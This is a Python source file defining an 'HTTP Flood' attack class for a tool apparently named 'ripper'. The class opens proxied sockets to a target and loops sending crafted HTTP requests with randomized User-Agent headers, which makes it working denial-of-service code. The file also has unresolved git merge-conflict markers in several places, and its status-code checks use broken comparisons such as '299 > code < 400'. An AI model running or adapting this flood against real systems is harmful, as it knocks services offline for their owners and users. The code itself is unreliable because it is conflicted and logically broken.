import random
import re
from contextlib import suppress
from socket import socket
from typing import Any
from socks import ProxyError

from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
<<<<<<< HEAD
from ripper.errors import *
=======
from ripper.context.events_journal import EventsJournal
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
from ripper.context.target import Target
from ripper.actions.attack_method import AttackMethod
from ripper.proxy import Proxy

HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
# Forward Reference
Context = 'Context'

Events = EventsJournal()


class HttpFlood(AttackMethod):
    """HTTP Flood method."""

    name: str = 'HTTP Flood'
    label: str = 'http-flood'

    _target: Target
    _ctx: Context
    _proxy: Proxy = None
    _http_connect: socket = None

    def __init__(self, target: Target, _ctx: Context):
        self._target = target
        self._ctx = _ctx

    def create_connection(self):
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as self._http_connect:
            self._http_connect.connect(self._target.hostip_port_tuple())
<<<<<<< HEAD
            self._target.stats.connect.status_success()
=======
            self._ctx.target.statistic.connect.status_success()
            Events.info('Creating HTTP connection...')
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue
            self._ctx.target.statistic.connect.status_failed()

    def check_response_status(self, payload: bytes):
        with suppress(Exception):
            if self._ctx.interval_manager.check_timer_elapsed(HTTP_STATUS_CODE_CHECK_PERIOD_SEC):
                check_sock = self.create_connection()
                check_sock.connect(self._target.hostip_port_tuple())
                check_sock.send(payload)
                http_response = repr(check_sock.recv(32))
                check_sock.close()
                status = int(re.search(HTTP_STATUS_PATTERN, http_response)[1])
                self._target.stats.http_stats[status] += 1
                self._send_event_with_status(status)

    @staticmethod
    def _send_event_with_status(code: int):
        base = 'Checked Response status...'
        if code < 300:
            Events.info(f'{base} {code}: Success')
        elif 299 > code < 400:
            Events.warn(f'{base} {code}: Redirection')
        elif code == 400:
            Events.warn(f'{base} {code}: Bad Request')
        elif 400 > code <= 403:
            Events.warn(f'{base} {code}: Forbidden')
        elif code == 404:
            Events.warn(f'{base} {code}: Not Found')
        elif 404 > code < 408:
            Events.warn(f'{base} {code}: Not Acceptable or Not Allowed')
        elif code == 408:
            Events.warn(f'{base} {code}: Request Timeout')
        elif 408 > code < 429:
            Events.error(f'{base} {code}: Client Error')
        elif code == 429:
            Events.error(f'{base} {code}: Too Many Requests')
        elif 429 > code < 459:
            Events.error(f'{base} {code}: Client Error')
        elif 460 >= code <= 463:
            Events.error(f'{base} {code}: AWS Load Balancer Error')
        elif 499 > code <= 511:
            Events.error(f'{base} {code}: Server Error')
        elif 520 >= code <= 530:
            Events.error(f'{base} {code}: CloudFlare Reverse Proxy Error')
        else:
            Events.error(f'{base} {code}: Custom Error')

    def send(self, sock: socket) -> bool:
        payload = self.payload().encode('utf-8')
        try:
            sent = sock.send(payload)
            self.check_response_status(payload)
        except ProxyError:
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
<<<<<<< HEAD
            self._target.errors_manager.add_error(HttpSendError(message=e))
            self._target.stats.connect.status_failed()
=======
            Events.exception(e)
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
        else:
            self._target.stats.packets.status_sent(sent)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    def headers(self, content: str = '') -> dict[str, str]:
        """Prepare headers."""
        headers = self._ctx.headers_provider.headers
        headers['Content-Length'] = str(len(content))
        headers['User-Agent'] = random.choice(self._ctx.headers_provider.user_agents)

        return headers

    def payload(self, body: str = '') -> str:
        """Generate payload for Request."""
        body_content = f'{body}\r\n\r\n' if body else '\r\n'
        headers = '\r\n'.join([f'{key}: {value}' for (key, value) in self.headers(body).items()])

        request = '{} {} HTTP/1.1\r\nHost: {}\r\n{}\r\n{}'.format(
            self._target.http_method.upper(),
            self._target.http_path,
            self._target.host,
            headers,
            body_content
        )

        return request
